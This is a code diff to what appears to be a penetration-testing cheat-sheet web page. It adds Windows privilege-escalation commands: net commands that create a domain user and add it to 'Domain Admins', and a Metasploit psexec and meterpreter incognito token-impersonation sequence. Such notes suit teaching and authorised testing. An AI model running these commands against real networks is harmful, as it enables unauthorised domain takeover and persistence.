@@ -80,6 +80,10 @@ import win_escalation_hhupd_3 from '../../../assets/win_escalation_hhupd_3.png';
 import win_escalation_hhupd_4 from '../../../assets/win_escalation_hhupd_4.png';
 import win_escalation_hhupd_5 from '../../../assets/win_escalation_hhupd_5.png';
 import win_escalation_hhupd_6 from '../../../assets/win_escalation_hhupd_6.png';
+import win_escalation_template_1 from '../../../assets/win_escalation_template_1.png';
+import win_escalation_template_2 from '../../../assets/win_escalation_template_2.png';
+import win_escalation_template_3 from '../../../assets/win_escalation_template_3.png';
+import win_escalation_template_4 from '../../../assets/win_escalation_template_4.png';
 import ExampleFrame from '../../exampleFrame/ExampleFrame';
 
 const PrivilegeEscalataion = () =>{
@@ -464,6 +468,28 @@ const PrivilegeEscalataion = () =>{
                 <ExampleFrame screen={win_escalation_hhupd_5}/>
                 <p>c:\windows\system32\cmd.exe</p>
                 <ExampleFrame screen={win_escalation_hhupd_6}/>
+            </details>
+
+            <hr />
+            <details>
+                <summary>create/ add to group user</summary>
+                <p>net /add <span className='waring'>{'<User name>'} {'<Password>'}</span> /domain</p>
+                <p>net group <span className='waring'>{'<Nazwa grupy- np: "Domain Admin">'} {'<Nazwa usera>'}</span> /ADD /DOMAIN</p>
+            </details>
+
+            <hr />
+
+            <details>
+                <summary>mfsconsole windows/smb/psexec - Token Impersonation </summary>
+                <ExampleFrame screen={win_escalation_template_1}/>
+                <p>meterpreter {'>'} <span className='waring'>load incognito</span></p>
+                <ExampleFrame screen={win_escalation_template_2}/>
+                <ExampleFrame screen={win_escalation_template_3}/>
+                <p>list_tokens -u</p>
+                <p>impersonate_token {'<Domena>/<User name>'}</p>
+                <ExampleFrame screen={win_escalation_template_4}/>
+                <p>net user /add {'<User name>'} {'<Password>'} /domain</p>
+                <p>net group "Domain Admins" {'User name'} /ADD /DOMAIN</p>
             </details>
 
 
